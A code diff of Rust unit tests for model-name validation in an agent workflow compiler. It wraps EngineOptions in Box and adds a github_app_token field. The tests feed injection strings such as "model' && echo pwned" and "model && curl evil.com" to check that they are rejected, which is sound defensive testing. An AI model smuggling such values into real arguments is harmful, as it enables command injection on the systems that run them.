@@ -4843,7 +4843,7 @@ safe-outputs:
     fn test_model_name_rejects_single_quote() {
         let mut fm = minimal_front_matter();
         fm.engine =
-            crate::compile::types::EngineConfig::Full(crate::compile::types::EngineOptions {
+            crate::compile::types::EngineConfig::Full(Box::new(crate::compile::types::EngineOptions {
                 id: Some("copilot".to_string()),
                 model: Some("model' && echo pwned".to_string()),
                 version: None,
@@ -4853,7 +4853,8 @@ safe-outputs:
                 env: None,
                 command: None,
                 timeout_minutes: None,
-            });
+                github_app_token: None,
+            }));
         let result = engine_args_for(&fm);
         assert!(result.is_err());
         assert!(
@@ -4868,7 +4869,7 @@ safe-outputs:
     fn test_model_name_rejects_space() {
         let mut fm = minimal_front_matter();
         fm.engine =
-            crate::compile::types::EngineConfig::Full(crate::compile::types::EngineOptions {
+            crate::compile::types::EngineConfig::Full(Box::new(crate::compile::types::EngineOptions {
                 id: Some("copilot".to_string()),
                 model: Some("model && curl evil.com".to_string()),
                 version: None,
@@ -4878,7 +4879,8 @@ safe-outputs:
                 env: None,
                 command: None,
                 timeout_minutes: None,
-            });
+                github_app_token: None,
+            }));
         let result = engine_args_for(&fm);
         assert!(result.is_err());
     }
@@ -4893,7 +4895,7 @@ safe-outputs:
         ] {
             let mut fm = minimal_front_matter();
             fm.engine =
-                crate::compile::types::EngineConfig::Full(crate::compile::types::EngineOptions {
+                crate::compile::types::EngineConfig::Full(Box::new(crate::compile::types::EngineOptions {
                     id: Some("copilot".to_string()),
                     model: Some(name.to_string()),
                     version: None,
@@ -4903,7 +4905,8 @@ safe-outputs:
                     env: None,
                     command: None,
                     timeout_minutes: None,
-                });
+                    github_app_token: None,
+                }));
             let result = engine_args_for(&fm);
             assert!(result.is_ok(), "Model name '{}' should be valid", name);
         }
